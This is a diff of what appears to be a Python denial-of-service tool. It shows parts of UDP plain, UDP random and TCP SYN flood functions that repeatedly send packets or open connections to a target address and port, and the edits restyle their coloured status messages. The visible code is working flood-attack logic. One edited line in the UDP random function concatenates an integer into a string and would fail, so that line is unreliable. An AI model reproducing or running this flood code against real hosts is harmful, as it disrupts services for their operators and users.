@@ -35,7 +35,7 @@ def udp_plain_flood(ip, port, duration, packet_size):
     try:
         while time.time() < end_time:
             time.sleep(0.2)
-            print(f"⚡\033[32m Starting UDP Plain flood on\033[36m {ip}\033[37m:\033[33m{port} \033[38;5;39m num-attack {packet_count}.\033[0m")
+            print(f"⚡\033[36m Starting UDP Plain flood on\033[37m {ip}\033[37m:\033[33m{port} \033[36m num-attack\033[37m {packet_count}.\033[0m")
             sock.sendto(payload, (ip, port))
             packet_count += 1
     except Exception as e:
@@ -53,7 +53,7 @@ def udp_random_flood(ip, port, duration, packet_size):
     try:
         while time.time() < end_time:
             time.sleep(0.2)
-            print("💥 \033[36m Starting UDP Random flood on \033[37m{ip}:\033[33m{port}\033[97m sent {packet_count} packets.")
+            print("💥 \033[36m Starting UDP Random flood on \033[37m{ip}:\033[33m{port}\033[97m sent" +(packet_count)+ " packets.")
             payload = random.randbytes(packet_size)  # Random payload
             sock.sendto(payload, (ip, port))
             packet_count += 1
@@ -74,7 +74,7 @@ def tcp_syn_flood_single(ip, port, duration):
         while time.time() < end_time:
             time.sleep(0.2)
             print("\033[48;5;1mStarting TCP SYN flood 0ne-Threads \033[0m \033[97m" +str(ip)+ " \033[33m0k..!\033[0m")
-            print("\033[91m Starting TCP SYN flood 0ne-Threads \033[32m" +str(packet_count)+ " \033[94mnumb-attack\033[0m")
+            print("\033[91m Starting TCP SYN flood 0ne-Threads \033[32m" +str(packet_count)+ " \033[94mnum-attack\033[0m")
             sock.connect_ex((ip, port))  # SYN flood doesn't complete handshake
             packet_count += 1
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # New socket each time
